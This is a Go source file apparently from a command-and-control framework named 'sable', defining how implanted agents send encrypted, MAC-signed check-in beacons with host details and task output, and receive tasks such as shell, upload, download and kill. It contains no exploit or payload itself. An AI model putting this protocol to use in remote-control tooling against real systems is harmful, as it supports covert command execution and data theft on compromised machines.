package protocol

import (
	"encoding/json"
	"errors"

	"github.com/aelder202/sable/internal/crypto"
)

// Beacon is sent from agent → server on every check-in.
type Beacon struct {
	AgentID    string      `json:"agent_id"`
	Timestamp  int64       `json:"ts"`
	Nonce      []byte      `json:"nonce"`
	Hostname   string      `json:"hostname"`
	OS         string      `json:"os"`
	Arch       string      `json:"arch"`
	TaskOutput *TaskResult `json:"output,omitempty"`
}

// TaskResult carries the output of a completed task back to the server.
type TaskResult struct {
	TaskID string `json:"task_id"`
	Type   string `json:"type"`
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// Task is sent from server → agent in the beacon response.
type Task struct {
	ID      string `json:"id"`
	Type    string `json:"type"` // shell | upload | download | sleep | kill | noop
	Payload string `json:"payload"`
}

// envelope is the wire format: plaintext agent_id, encrypted payload, MAC over agentID+ciphertext.
type envelope struct {
	AgentID    string `json:"id"`
	Ciphertext []byte `json:"data"`
	Sig        []byte `json:"sig"`
}

// macInput binds the envelope AgentID to the ciphertext so neither field can be
// changed independently without invalidating the MAC.
func macInput(agentID string, ciphertext []byte) []byte {
	id := []byte(agentID)
	buf := make([]byte, len(id)+len(ciphertext))
	copy(buf, id)
	copy(buf[len(id):], ciphertext)
	return buf
}

// EncodeBeacon encrypts and signs a Beacon using the agent's pre-shared secret.
// Pattern: Encrypt-then-MAC; MAC covers agentID||ciphertext to bind identity to payload.
func EncodeBeacon(b *Beacon, secret []byte) ([]byte, error) {
	key, err := crypto.DeriveKey(secret, "beacon")
	if err != nil {
		return nil, err
	}
	plaintext, err := json.Marshal(b)
	if err != nil {
		return nil, err
	}
	ct, err := crypto.Encrypt(key, plaintext)
	if err != nil {
		return nil, err
	}
	env := envelope{
		AgentID:    b.AgentID,
		Ciphertext: ct,
		Sig:        crypto.Sign(secret, macInput(b.AgentID, ct)),
	}
	return json.Marshal(env)
}

// DecodeBeacon verifies the MAC then decrypts. Returns error on any failure.
// MAC is verified before decryption to prevent padding oracle and tampering.
// The decrypted AgentID is additionally verified against the envelope AgentID to
// prevent cross-agent impersonation (a rogue agent setting a victim's ID inside
// an otherwise validly-signed payload).
func DecodeBeacon(data, secret []byte) (*Beacon, error) {
	var env envelope
	if err := json.Unmarshal(data, &env); err != nil {
		return nil, errors.New("invalid envelope")
	}
	if !crypto.Verify(secret, macInput(env.AgentID, env.Ciphertext), env.Sig) {
		return nil, errors.New("invalid signature")
	}
	key, err := crypto.DeriveKey(secret, "beacon")
	if err != nil {
		return nil, err
	}
	plaintext, err := crypto.Decrypt(key, env.Ciphertext)
	if err != nil {
		return nil, errors.New("decryption failed")
	}
	var b Beacon
	if err := json.Unmarshal(plaintext, &b); err != nil {
		return nil, errors.New("invalid beacon payload")
	}
	if b.AgentID != env.AgentID {
		return nil, errors.New("agent ID mismatch")
	}
	return &b, nil
}

// EncodeTask encrypts and signs a Task for delivery to an agent.
func EncodeTask(t *Task, secret []byte) ([]byte, error) {
	key, err := crypto.DeriveKey(secret, "response")
	if err != nil {
		return nil, err
	}
	plaintext, err := json.Marshal(t)
	if err != nil {
		return nil, err
	}
	ct, err := crypto.Encrypt(key, plaintext)
	if err != nil {
		return nil, err
	}
	env := envelope{Ciphertext: ct, Sig: crypto.Sign(secret, ct)}
	return json.Marshal(env)
}

// DecodeTask verifies and decrypts a Task response.
func DecodeTask(data, secret []byte) (*Task, error) {
	var env envelope
	if err := json.Unmarshal(data, &env); err != nil {
		return nil, errors.New("invalid envelope")
	}
	if !crypto.Verify(secret, env.Ciphertext, env.Sig) {
		return nil, errors.New("invalid signature")
	}
	key, err := crypto.DeriveKey(secret, "response")
	if err != nil {
		return nil, err
	}
	plaintext, err := crypto.Decrypt(key, env.Ciphertext)
	if err != nil {
		return nil, errors.New("decryption failed")
	}
	var task Task
	if err := json.Unmarshal(plaintext, &task); err != nil {
		return nil, errors.New("invalid task payload")
	}
	return &task, nil
}

// RandomNonce returns 16 cryptographically random bytes for use as a beacon nonce.
func RandomNonce() ([]byte, error) {
	return crypto.RandomBytes(16)
}
